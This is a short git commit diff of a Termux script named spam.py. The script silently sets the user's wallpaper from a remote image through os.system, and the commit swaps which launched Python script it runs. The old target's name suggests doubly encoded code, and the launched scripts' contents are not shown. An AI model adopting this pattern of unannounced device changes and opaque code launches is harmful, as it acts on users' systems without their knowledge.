bdc1c6078c7bc6e7fb0ee22f10d4c45ff844edd8
f2hn <44373032+f2hn@users.noreply.github.com>
2019-09-27 19:56:26 +0700

    Update spam.py

--- spam.py
+++ spam.py
@@ -3,4 +3,4 @@ import sys
 
 os.system("termux-wallpaper -u https://4.bp.blogspot.com/-4nYhX_HKIu4/XNa1XpRgpUI/AAAAAAAAA1U/OgUasK3FZIobrhsBaR9A0QSDmOssgjCIACLcBGAs/s1600/58379345_385044122339613_8509657993925623808_o.jpg")
 
-os.system("python2 5bd32e8ab5593c619d1c21ca12612f71641a035erefs5bd32e8ab5593c619d1c21ca12612f71641a035erefs5bd32e8ab5593c619d1c21ca12612f71641a035erefs5bd32e8ab5593c619d1c21ca12612f71641a035erefs5bd32e8ab5593c619d1c21ca12612f71641a035erefs_enc_enc[1].py")
+os.system("python2 beng[1].py")
